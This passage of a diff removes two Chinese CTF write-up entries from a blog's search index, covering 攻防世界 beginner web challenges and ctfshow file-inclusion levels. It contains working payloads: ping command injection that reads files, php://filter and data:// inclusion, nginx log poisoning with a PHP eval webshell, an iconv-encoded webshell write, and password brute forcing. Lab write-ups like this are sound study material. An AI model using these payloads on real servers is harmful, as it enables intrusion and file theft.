         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界</title>
-    <url>/p/6f63874a.html</url>
-    <content><![CDATA[<h1 id="爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳"><a href="#爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳" class="headerlink" title="爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳"></a>爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳</h1><h1 id="攻防世界🐱‍👓"><a href="#攻防世界🐱‍👓" class="headerlink" title="攻防世界🐱‍👓"></a>攻防世界🐱‍👓</h1><h2 id="MiscOne-this-is-flag"><a href="#MiscOne-this-is-flag" class="headerlink" title="MiscOne:this is flag"></a>MiscOne:this is flag</h2><p>直接在题目中出现了flag，此题教你如何输入答案</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="WebTwo-view-source"><a href="#WebTwo-view-source" class="headerlink" title="WebTwo:view_source"></a>WebTwo:view_source</h2><p>由于右键不可用，而这道题需要查看源代码，有以下几种方法可以查看</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDFCPMNLMMGKMCOHAGOGH" alt="图片.png">查看网页源代码的方式有4种，分别是：</p>
-<p>1、鼠标右击会看到”查看源代码“，这个网页的源代码就出现在你眼前了；</p>
-<p>2、可以使用快捷Ctrl+U来查看源码；</p>
-<p>3、在地址栏前面加上view-source，如view-source</p>
-<p>4、浏览器的设置菜单框中，找到“更多工具”，然后再找开发者工具，也可以查看网页源代码</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="Three：robots"><a href="#Three：robots" class="headerlink" title="Three：robots"></a>Three：robots</h2><p>本题考察的是robots协议，解题过程是先查找robots.txt，根据其中的路径进一步查找</p>
-<p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。我们可以查看robots.txt文件，看看里面有什么内容（源自网络）</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="Four：backup"><a href="#Four：backup" class="headerlink" title="Four：backup"></a>Four：backup</h2><p>常见的备份文件后缀名为.bak</p>
-<p>直接在网站后加上index.php.bak下载其中的文件再打开就可以查看到flag。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="Five-cookie"><a href="#Five-cookie" class="headerlink" title="Five:cookie"></a>Five:cookie</h2><p>Cookie是保存在客户端的纯文本文件。比如txt文件。所谓的客户端就是我们自己的本地电脑。当我们使用自己的电脑通过浏览器进行访问网页的时候，服务器就会生成一个证书并返回给我的浏览器并写入我们的本地电脑。这个证书就是cookie。一般来说cookie都是服务器端写入客户端的纯文本文件。</p>
-<p>本题用brup抓包查看cookie</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>题目提示cookie，那就访问cookie.php试试看，就算没想到这个，也可以试试按F12在“网络”或者“存储”模块看看有没有cookie相关信息，恰巧两个都有cookie.php,试着访问一下，发现让你See the http response（看看http响应头）（出自网站）</p>
-<h2 id="Six：disabled-button"><a href="#Six：disabled-button" class="headerlink" title="Six：disabled_button"></a>Six：disabled_button</h2><p>看到需要修改页面马上想到F12在查看器修改对应的东西，题目提示很明显，找跟disabled想关的东西就行，这个主要涉及到了前端的一些知识，在网页这边就可以修改。然后直接删除这个disable的东西再按一下flag就马上出来了。</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>disabled 属性规定应该禁用 input 元素。被禁用的 input 元素既不可用，也不可点击。可以设置 disabled 属性，直到满足某些其他的条件为止（比如选择了一个复选框等等）。然后，就需要通过 JavaScript 来删除 disabled 值，将 input 元素的值切换为可用。</p>
-<h2 id="Seven：weak-auth"><a href="#Seven：weak-auth" class="headerlink" title="Seven：weak_auth"></a>Seven：weak_auth</h2><p>审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="Eight：weak-auth"><a href="#Eight：weak-auth" class="headerlink" title="Eight：weak auth"></a>Eight：weak auth</h2><p>使用爆破装置，但是爆破过程麻烦。道题是个弱密码题，随便尝试登录，会告诉你用admin来登录</p>
-<p>首先你需要用burt抓包，然后需要一个密码本</p>
-<p>爆破后根据密码长度不同帅选密码。</p>
-<h2 id="Nine-simpe-php"><a href="#Nine-simpe-php" class="headerlink" title="Nine:simpe php"></a>Nine:simpe php</h2><p>这里考察的是简单的代码理解</p>
-<p>通过get方法得到a和b的值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">is_numeric() 函数用于检测变量是否为数字或数字字符串。</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>   我们已经获得一部分flag了，接下来就是整flag2，首先b不能是整数或数字字符串，就是不能都是数字，最后还需要值大于1234，那么我们可以构造个12345a，值大于1234，并且不是纯数字（这里构造方式很多样，你甚至都可以b=12345[]）于是我的payload构造为?a==0&amp;b=12345a。</p>
-<h2 id="Ten-get-post"><a href="#Ten-get-post" class="headerlink" title="Ten:get-post"></a>Ten:get-post</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>直接按照要求一步步进行就可以完成得出flag，直接放入url也可以；</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">了解http请求方法，此处考察get和post两个最常用的请求方法。</span><br><span class="line"></span><br><span class="line">HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：</span><br><span class="line"></span><br><span class="line">GET：向特定的资源发出请求。</span><br><span class="line"></span><br><span class="line">POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</span><br><span class="line"></span><br><span class="line">OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送<span class="string">&#x27;*&#x27;</span>的请求来测试服务器的功能性。</span><br><span class="line"></span><br><span class="line">HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</span><br><span class="line"></span><br><span class="line">PUT：向指定资源位置上传其最新内容。</span><br><span class="line"></span><br><span class="line">DELETE：请求服务器删除Request-URI所标识的资源。</span><br><span class="line"></span><br><span class="line">TRACE：回显服务器收到的请求，主要用于测试或诊断。</span><br><span class="line"></span><br><span class="line">CONNECT：HTTP/<span class="number">1.1</span>协议中预留给能够将连接改为管道方式的代理服务器。</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Eleven：xxf-referer"><a href="#Eleven：xxf-referer" class="headerlink" title="Eleven：xxf-referer"></a>Eleven：xxf-referer</h2><p>卷吕</p>
-<p>   xff:是X-Forwarded-For的简写，用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br>    referer:是告诉服务器我是从哪个地方来的</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>首先就是对于ip地址的一个要求，这里我们用bo抓包来修改IP地址，为了方便，我们抓包后发送到repeter来进行。<br>考虑到修改IP地址，所以我们需要在响应头中添加 <code>X-Forwarded-For: 123.123.123.123</code>（常用修改ip地址的方法），这里有一个点需要注意一下，就是这条语句不能放在最下面一行，也不知道是不是我的bp的问题，如果放在最下面就访问总是失败（文章说的）。</p>
-<p>在响应包中看到了这么一句js语句，结合题目要求，所以我们构造referer内容：<code>Referer:https://www.google.com</code></p>
-<h2 id="Twelve：webshell"><a href="#Twelve：webshell" class="headerlink" title="Twelve：webshell"></a>Twelve：webshell</h2><p>此题使用蚁剑，上传一句话木马就好，题目也提醒了，百度了php一句话，并且把它放在index.php</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>打开后直接就能看到flag的文件。</p>
-<p>也可以运用hackbar进行解题</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>源自网络，本人测试不成功。</p>
-<h2 id="Thirteen：command-execution"><a href="#Thirteen：command-execution" class="headerlink" title="Thirteen：command-execution"></a>Thirteen：command-execution</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>本题解题过程就是先尝试一下这个ping 的东西，随便弄个网址，再试一下拼接，接下来就要尝试找flag的相关名字，找到一堆后再找其文件名。</p>
-<p>1.先ping<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>2.拼接一下其他东西，是可以ping通的，那么我们就来尝试命令拼接执行的方法了。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>&amp;&amp;ls</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>3.127.0.0.1 &amp;&amp;find / -name “flag*”命令拼接是可以执行的，同时也确定了这是一台linux服务器，，所以开始我们本次的目标，获得flag，，所以我们全局搜索flag，命令如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp;&amp;find / -name <span class="string">&quot;flag*&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>4.虽然出来很多，但是我们可以明显感觉到flag.txt里就是我们的答案，所以我们cat查看一下。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>&amp;&amp;cat /home/flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="Fourteen：simple-js"><a href="#Fourteen：simple-js" class="headerlink" title="Fourteen：simple_js"></a>Fourteen：simple_js</h2><p>此题先需要随便输入一个密码但是发现怎么都是错的，但是题目提醒js，查看源码发现一堆代码，很容易想到要解析代码，这一段代码需要将它转换成10进制，再转换成ascle表</p>
-<p>此题的解码来源于网站<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-]]></content>
-      <categories>
-        <category>web ctf</category>
-      </categories>
-      <tags>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含</title>
-    <url>/p/31915a1e.html</url>
-    <content><![CDATA[<h1 id="csdn博客，web教学文件包含"><a href="#csdn博客，web教学文件包含" class="headerlink" title="csdn博客，web教学文件包含"></a>csdn博客，web教学文件包含</h1><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h1 id="ctfshow🙌🤞✌👏👍👌"><a href="#ctfshow🙌🤞✌👏👍👌" class="headerlink" title="ctfshow🙌🤞✌👏👍👌"></a>ctfshow🙌🤞✌👏👍👌</h1><h1 id="文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖"><a href="#文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖" class="headerlink" title="文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖"></a>文件包含🐱‍🏍🦽🦼🚚🚛🚜🚔🚖</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><h3 id="PHP伪协议读取"><a href="#PHP伪协议读取" class="headerlink" title="PHP伪协议读取"></a>PHP伪协议读取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">伪协议相关知识点网站：https://blog.csdn.net/weixin_29466397/article/details/115978566</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h3><p>先用hackbar输入?file=php://filter/convert.base64-encode/resource=flag.php</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDDDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>直接excute得出base64加密，再解密。不能缺少convert，这是转换编码的。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php伪协议，事实上是其支持的协议与封装协议。而其支持的协议有：</span><br><span class="line"></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流(I/O streams)</span></span><br><span class="line"></span><br><span class="line">data:<span class="comment">// — 数据(RFC 2397)</span></span><br><span class="line"></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
-
-<p>一道例题：比如根据题目已经知道flag就在index.php文件里，所以就用PHP://filter读取index.php</p>
-<p>然后进行Base64解码就得到flag</p>
-<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>这是题目，php被？？？替换掉了，因此不能明文读取文件</p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>方法解题：1.题目直接查看源代码，然后输入后，直接可以查看flag</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><h3 id="文件包含日志上传，一句话木马，运用蚁剑"><a href="#文件包含日志上传，一句话木马，运用蚁剑" class="headerlink" title="文件包含日志上传，一句话木马，运用蚁剑"></a>文件包含日志上传，一句话木马，运用蚁剑</h3><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>题目中date，php都被替换了，不能直接使用。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">关键包含日志文件 进行getshell 日志文件路径： ?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>先用hackbar进行excute,再用burpsuit抓包，之后修改user，上传一句话木马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>@evaluate（取前四个字母）(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])；<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>之后用蚁剑上传excute后了网站，密码为cmd，打开就可以查看flag；<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><h3 id="绕过die-usr-2"><a href="#绕过die-usr-2" class="headerlink" title="绕过die    usr-2"></a>绕过die    usr-2</h3><p>相关网站：<a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>date，base64都被过滤掉了。引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</span><br><span class="line"> iconv ( string $in_charset , string $out_charset , string $str )：将字符串$str从in_charset编码转换到$out_charset</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php （创建一个a.php）</span></span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?(上传一个<span class="number">1</span>的文件到a.php)</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDEDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
-<p>再查看源码就能得到flag，根据上面箭头的一步步解题下来。</p>
-<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>第一种方法如web80</p>
-<p>第二种方法：直接先抓包，再进行修改user，传入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval’tuate‘($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接着传入 ?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-
-<p>再运行查看源码就ok</p>
-]]></content>
-      <categories>
-        <category>web ctf</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
       </tags>
   </entry>
 </search>
